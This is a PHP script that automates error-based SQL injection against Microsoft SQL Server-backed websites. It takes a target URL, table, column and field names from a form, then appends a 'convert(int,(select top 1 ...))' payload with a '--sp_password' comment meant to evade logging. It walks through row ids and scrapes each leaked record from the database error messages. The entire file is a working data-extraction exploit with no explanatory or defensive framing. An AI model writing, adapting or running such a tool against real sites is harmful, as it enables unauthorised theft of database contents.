<?php
ini_set ("max_execution_time","360000");

function convert($chuoi)
{
	$temp="char(";
	for ($i=0;$i<strlen($chuoi)-1;$i++)
	{
		$temp.=ord($chuoi[$i]).")%2bchar(";
	}
	$temp.=ord($chuoi[strlen($chuoi)-1]).")";
	return $temp;
}

class CURL 
{
	var $callback = false;

	function setCallback($func_name) 
	{
		$this->callback = $func_name;
	}

	function doRequest($method, $url, $vars) 
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		if ($method == 'POST') 
		{
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		if ($data) 
		{
			if ($this->callback)
			{
				$callback = $this->callback;
				$this->callback = false;
				return call_user_func($callback, $data);
			} 
			else 
			{
			return $data;
			}
		} 
		else
		{
		return curl_error($ch);
		}
	}

	function get($url) 
	{
		return $this->doRequest('GET', $url, 'NULL');
	}

	function post($url, $vars) 
	{
		return $this->doRequest('POST', $url, $vars);
	}
}

$cc = new CURL();
echo "<pre>";

$url=$_POST["link"];
$table_value=$_POST["table_value"];
$column_value=$_POST["column_value"];
$quantity=$_POST["quantity"];
$last_id=$_POST["last_id"];
$field_values=$_POST["field_values"];
$field_value=explode("\n", $field_values);
$i=0;
while ($field_value[$i]!='')
{
	$i++;
	$field_value[$i]=trim($field_value[$i]);
}
$field_value[0]=trim($field_value[0]);
$url.="%20and%201=convert(int,(select%20top%201%20";
for ($j=0;$j<$i;$j++)
{
	$url.="%2bchar(32)%2bchar(124)%2bchar(32)%2bconvert(varchar,isnull(convert(varchar,".$field_value[$j]."),char(32)))";
}
$url.="%20from%20".$table_value;

$k=0;
while ($k<$quantity)
{
	$track=$last_id-$k;
	$k++;
	
	$url_o=$url."%20where%20".$column_value."=".$track."))--sp_password";
	$dat = $cc->get("$url_o");
	@eregi ("value '(.*)' to",$dat,$out);
	echo "$out[1]\n";
}
echo "Link Get : \n";

echo $url_o;
?>